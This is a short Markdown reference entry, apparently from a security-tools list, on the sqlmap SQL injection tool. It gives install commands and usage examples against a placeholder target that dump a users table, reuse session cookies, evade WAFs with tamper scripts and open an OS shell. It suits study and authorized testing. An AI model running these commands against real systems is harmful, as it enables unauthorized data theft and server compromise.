# sqlmap

> Automated SQL injection detection and exploitation — finds injectable
> parameters, then dumps databases, reads files, or pops a shell.

- **Link:** https://github.com/sqlmapproject/sqlmap (site: https://sqlmap.org)
- **Type:** open source
- **Platform:** cross-platform (Python)

## Description

sqlmap automates the whole SQL injection workflow: it detects whether a
parameter is injectable, fingerprints the DBMS, and then exploits it — from
enumerating databases and tables down to extracting data, reading/writing files,
and executing OS commands. It supports MySQL, PostgreSQL, MSSQL, Oracle, SQLite
and many more, plus every common injection technique (boolean/time-based blind,
error-based, UNION, stacked queries).

## Installation

```bash
# Debian/Kali package
sudo apt install sqlmap

# Or clone the latest from source
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

## Usage examples

```bash
# Test a single GET parameter
sqlmap -u "https://target.example.com/item.php?id=1"

# Enumerate the databases once injectable (--batch = accept all defaults)
sqlmap -u "https://target.example.com/item.php?id=1" --dbs --batch

# List tables in a chosen database, then dump one table
sqlmap -u "https://target.example.com/item.php?id=1" -D shopdb --tables
sqlmap -u "https://target.example.com/item.php?id=1" -D shopdb -T users --dump

# Test a POST request / JSON body
sqlmap -u "https://target.example.com/login" --data="user=a&pass=b"

# Feed a raw request saved from Burp (handles cookies/headers/auth for you)
sqlmap -r request.txt --level 5 --risk 3

# Use an authenticated session cookie
sqlmap -u "https://target.example.com/account?id=1" --cookie="PHPSESSID=abc123"

# Try to get an interactive OS shell (when privileges allow)
sqlmap -u "https://target.example.com/item.php?id=1" --os-shell
```

## Notes & references

- `--level` (1–5) widens *where* it tests (headers, cookies); `--risk` (1–3)
  controls how intrusive the payloads are. Raise them only when needed.
- `--batch` runs non-interactively; `--tamper=<script>` applies evasion
  transforms (e.g. `space2comment`) to slip past simple WAFs.
- Saving a request from [Burp Suite](burp-suite.md) and passing it with `-r` is
  the most reliable way to test complex authenticated requests.
- Only test applications you are authorized to assess — sqlmap can be highly
  destructive with `--dump-all` / `--os-shell`.
- Docs: https://github.com/sqlmapproject/sqlmap/wiki
